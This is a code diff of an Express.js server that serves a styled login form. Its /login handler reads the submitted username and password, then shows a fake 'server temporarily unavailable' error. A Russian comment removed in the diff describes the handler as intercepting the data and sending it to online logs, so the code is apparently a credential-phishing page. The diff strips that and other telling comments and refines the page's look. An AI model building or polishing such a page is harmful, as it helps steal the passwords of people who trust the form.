@@ -2,10 +2,8 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Настройка Express для корректного чтения текстовых данных из HTML-формы
 app.use(express.urlencoded({ extended: true }));
 
-// 1. МАРШРУТ ДЛЯ ОТОБРАЖЕНИЯ СТРАНИЦЫ АВТОРИЗАЦИИ
 app.get('/', (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -23,7 +21,7 @@ app.get('/', (req, res) => {
 
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
-            background-color: #1a1c20;
+            background-color: #1e1f23;
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -33,36 +31,35 @@ app.get('/', (req, res) => {
 
         .auth-container { 
             background-color: #23252b;
-            padding: 32px 28px; 
-            border-radius: 8px; 
+            padding: 40px 32px 36px; 
+            border-radius: 12px; 
             width: 100%;
-            max-width: 380px; 
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
+            max-width: 400px; 
         }
 
         h1 {
             color: #ffffff; 
             text-align: center; 
             margin-bottom: 28px; 
-            font-size: 26px; 
+            font-size: 28px; 
             font-weight: 700; 
-            letter-spacing: -0.3px;
+            letter-spacing: -0.4px;
         }
 
         .input-control { 
             width: 100%; 
             padding: 14px 16px; 
             margin-bottom: 14px; 
-            background-color: #2e3138;
-            border: 1px solid #3f434a; 
+            background-color: #2d3038;
+            border: 1px solid #3a3e47; 
             border-radius: 8px; 
             color: #ffffff; 
             font-size: 15px; 
-            transition: all 0.2s ease; 
+            transition: all 0.15s ease; 
         }
 
         .input-control::placeholder { 
-            color: #8b8f97; 
+            color: #9a9ea6; 
         }
         
         .input-control:focus { 
@@ -81,67 +78,57 @@ app.get('/', (req, res) => {
             font-size: 16px; 
             font-weight: 600; 
             cursor: pointer; 
-            margin-top: 6px;
+            margin-top: 4px;
             margin-bottom: 22px; 
-            transition: background-color 0.2s ease, transform 0.1s ease; 
+            transition: background-color 0.15s ease; 
         }
         
         .btn-submit:hover { 
             background-color: rgba(255, 255, 255, 0.08); 
-        }
-        
-        .btn-submit:active { 
-            transform: scale(0.98); 
         }
 
         .link-text { 
             display: block; 
             text-align: center; 
             color: #ffffff; 
-            font-size: 14px; 
+            font-size: 14.5px; 
             font-weight: 500; 
             text-decoration: none; 
-            margin-bottom: 22px; 
-            transition: color 0.2s; 
+            margin-bottom: 24px; 
         }
 
         .link-text:hover { 
             text-decoration: underline; 
-            color: #c5c9d1; 
         }
 
         .secondary-actions { 
             display: flex;
             flex-direction: column;
             gap: 12px;
-            margin-bottom: 24px;
+            margin-bottom: 26px;
         }
 
         .btn-secondary { 
             width: 100%; 
             padding: 14px; 
-            background-color: #2e3138; 
+            background-color: #2d3038; 
             border: none; 
             border-radius: 8px; 
             color: #ffffff; 
             font-size: 15px; 
             font-weight: 500; 
             cursor: pointer; 
-            transition: background-color 0.2s ease, transform 0.1s ease; 
+            transition: background-color 0.15s ease; 
         }
         
         .btn-secondary:hover { 
             background-color: #383c45; 
         }
-        
-        .btn-secondary:active { 
-            transform: scale(0.98); 
-        }
 
         .signup-text {
             text-align: center;
             color: #ffffff;
-            font-size: 14px;
+            font-size: 14.5px;
             font-weight: 500;
         }
 
@@ -153,7 +140,6 @@ app.get('/', (req, res) => {
 
         .signup-text a:hover {
             text-decoration: underline;
-            color: #c5c9d1;
         }
     </style>
 </head>
@@ -183,7 +169,6 @@ app.get('/', (req, res) => {
     `);
 });
 
-// 2. БЭКЕНД: ПРИЕМ, ПЕРЕХВАТ ДАННЫХ И ИХ ОТПРАВКА В ОНЛАЙН-ЛОГИ
 app.post('/login', (req, res) => {
     const userLogin = req.body.username;
     const userPassword = req.body.password;
@@ -197,7 +182,6 @@ app.post('/login', (req, res) => {
     res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
 });
 
-// Запуск прослушивания входящего сетевого трафика на сервере
 app.listen(PORT, () => {
     console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
 });
